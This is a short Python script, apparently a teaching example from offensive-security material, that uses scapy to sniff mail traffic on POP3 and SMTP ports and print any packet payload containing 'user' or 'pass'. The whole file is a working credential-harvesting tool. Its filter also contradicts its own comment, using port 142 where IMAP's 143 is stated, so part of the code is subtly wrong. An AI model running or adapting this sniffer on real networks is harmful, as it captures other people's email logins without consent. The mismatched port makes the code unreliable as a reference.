from scapy.all import *

# Our packet callback 
def packet_callback(packet):
    
    if packet[TCP].payload:

        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():

            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload



# Fire up our sniffer; POP3 (110), IMAP (143), and SMTP (25)
sniff(filter = "tcp port 110 or tcp port 25 or tcp port 142", prn = packet_callback, store = 0)


